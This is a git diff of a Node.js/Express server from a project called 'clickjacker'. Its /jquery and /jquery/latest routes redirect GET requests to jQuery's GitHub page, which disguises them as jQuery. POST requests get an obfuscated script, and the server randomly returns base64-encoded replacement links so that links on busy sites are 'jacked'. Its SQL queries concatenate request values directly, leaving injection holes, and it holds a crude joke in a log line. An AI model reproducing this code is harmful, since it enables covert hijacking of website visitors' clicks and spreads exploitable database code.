@@ -28,13 +28,6 @@ var multer = require('multer');
 var errorHandler = require('errorhandler');
 var cookieParser = require('cookie-parser')
 
-/* 
- * DEPLOYMENT MODE: client-mode will serve only
- * the client service calls. true to enable
- * false to disable. If false, server will be in
- * admin mode and will serve only user admin pages
- */
-app.set('client-mode', false);
 //Date prototype for converting Date() to MySQL DateTime format
 Date.prototype.toMysqlFormat = function () {
     function pad(n) { return n < 10 ? '0' + n : n }
@@ -70,7 +63,7 @@ var connection = mysql.createConnection({
 connection.connect();
 
 //change depending on your dev setup or for production
-var base_clickjacker_dir = "/home/troy/git/clickjacker";
+var base_clickjacker_dir = "/Users/alfstad/Desktop/clickjacker";
 
 function checkAuth(req, res, next) {
     if (req.session.user_id === 'admin') {
@@ -99,52 +92,43 @@ function getNextCodeDelimiter() {
       newCode[i] = code[i] + 1;
     }
   }
-  console.log(newCode);
+  //console.log(newCode);
   return newCode;
-} 
+}
 
-function getClientResponseJSON(uuid, url) {
+function getClientResponseJSON(uuid, url, fn) {
   /* 1.get the links from the lander_info based on the uuid */
-  connection.query("select links_list from lander_info where uuid='" + uuid + "'", function(err, docs) {
-    if(docs.length == 1) {
+  var response = "";
+  connection.query("select links_list from lander_info where uuid='" + uuid + "' and registered='1'", function(err, docs) {
+    if(docs.length > 0) {
       var links = docs[0].links_list;
-      var linksArr = links.split(",");
-      var response = "";
-
-      /* 2. transform that into base64 code */
-      for(var i=0 ; i<linksArr.length ; i++) {
-        response += new Buffer(linksArr[i]).toString('base64') + getNextCodeDelimiter();
+      if(links) {
+        var linksArr = links.split(",");
+        /* 2. transform that into base64 code */
+        for(var i=0 ; i<linksArr.length ; i++) {
+          response += new Buffer(linksArr[i]).toString('base64') + getNextCodeDelimiter();
+        }
       }
-
       /* 3. get the rate from pulse table based on url */
       connection.query("select rate from pulse where url = '" + url +"'", function(err, docs) {
-        if(docs.length ==1) {
+        if(docs) {
           //get random number, if its above 15 dont jack, otherwise jack
           var randomNumber = Math.random() * 100;
           if(docs[0].rate > 30) { //views/min
             if(randomNumber <= 15) {
-                return {
-                    jquery: response
-                }
+                fn({
+                  jquery: response
+                });
             } else {
-                return {
-                    jquery: false
-                }
+                fn({
+                  jquery: false
+                });
             }
           }
-        } else {
-            //dont jack
         }
       });
-
-    } else {
-      //error, no jack, log
-      console.log('error determining whether or not to jack link');
-      return { 
-        jquery: false
-      };
     }
-  });
+  }); 
 }
 
 function checkAdmin(req, res, next) {
@@ -155,17 +139,7 @@ function checkAdmin(req, res, next) {
     }
 }
 
-function setClientOrAdminMode(req, res, next) {
-    if(app.get('client-mode')) {
-        if(req.url.substring(0,7) == '/jquery' || req.url.substring(0,16) == '/all_domains/new') {
-            next();
-        }    
-    } else {
-        if(req.url.substring(0,7) != '/jquery' && req.url.substring(0,16) != '/all_domains/new') {
-            next();
-        }
-    }
-}
+
 
 app.get('/', checkAuth, function( req, res) {
     res.render('index');
@@ -602,8 +576,6 @@ app.get('/all_domains/update_click_count', checkAuth, function (req, res) {
             //Do nothing, just update the DB            
         });
     });
-
-    
 });
 
 //Get and load client js
@@ -612,32 +584,52 @@ app.get('/jquery', function (req, res) {
       'Location': 'https://github.com/jquery/jquery',
       'Expires': (new Date()).toGMTString()
     });
-
     res.end();
-
 });
 
 app.post('/jquery', function(req, res) {
-    var user=req.body.version;
-
-    connection.query("SELECT secret_username FROM users WHERE secret_username = ?", [user], function(err, docs) {
-        if(docs.length == 1) {
-            fs.readFile('./client/compressed/compressed-landercode.js', function(err, data) {
-                if(err) throw err;
-                
-                var replacedFile = String(data).replace('replaceme', user);       
-               
-                res.writeHead(200, {
-                        'Content-Length': replacedFile.length,
-                        'Content-Type': 'text/plain',
-                        'Access-Control-Allow-Origin': '*',
-                        'Access-Control-Allow-Methods': 'GET, OPTIONS',
-                        'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
-                    });
-                    res.end(replacedFile);
-            }); 
-        }
+    var uuid=req.body.version;
+    fs.readFile('./client/compressed/compressed-landercode.js', function(err, data) {
+      if(err) throw err;
+      var replacedFile = String(data).replace('replaceme', uuid);       
+      res.writeHead(200, {
+        'Content-Length': replacedFile.length,
+        'Content-Type': 'text/plain',
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Methods': 'GET, OPTIONS',
+        'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
+      });
+      res.end(replacedFile);
     });
+});
+
+app.get('/jquery/latest', function (req, res) {
+    res.writeHead(301, { //You can use 301, 302 or whatever status code
+      'Location': 'https://github.com/jquery/jquery',
+      'Expires': (new Date()).toGMTString()
+    });
+    res.end();
+});
+
+app.post('/jquery/latest', function(req, res) {
+  // var url = req.body.referer;
+  // var uuid = req.body.version;
+  // var datetime = new Date().toMysqlFormat();
+  var url = "freehairywomen.com";
+  var uuid = "0c59f130-8044-11e4-98fc-f7d283fea7f2";
+  var datetime = new Date().toMysqlFormat();
+
+  connection.query("select process_lander_request(?,?,?) AS value;", [url, uuid, datetime], function(err, docs) {
+    if(docs) {
+      var response = docs.value;
+      //send back data!
+      res.status(200);
+      var response = getClientResponseJSON(uuid, url, function(response) {
+        res.send(response);
+      });
+
+    } else { console.log("your mommas so fat she sat on a dolla and made 4 quarters ;D"); }
+  });
 
 });
 
@@ -976,11 +968,6 @@ app.post('/upload_remote', function(req, res) {
     );
 
 });
-
-
-
-//app.all('*', setClientOrAdminMode);
-//module.exports = app;
 
 app.listen('9000')
 console.log('Magic happens on port 9000');
